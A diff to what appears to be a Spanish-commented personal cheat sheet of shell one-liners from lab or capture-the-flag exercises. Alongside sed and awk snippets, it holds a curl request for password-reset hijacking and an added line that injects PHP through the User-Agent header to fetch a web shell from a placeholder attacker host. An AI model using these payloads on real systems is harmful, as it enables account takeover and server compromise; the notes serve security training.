@@ -37,6 +37,7 @@ sed 's/ //g' hash.txt # elimina todas las lineas en blanco
 sed '/^[[:space:]]*$/d' # elimina los espacios 
 --------------------
 curl 'http://10.10.154.13/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=test@customer.acmeitsupport.thm' # reset password hijacking
+curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://{ATTACKER_IP}/shell.php'))?>" -s http://{MACHINE_IP}%
 ------------------
 awk '{print "https://"$1}'
 awk '{print $1 ":" $2}'
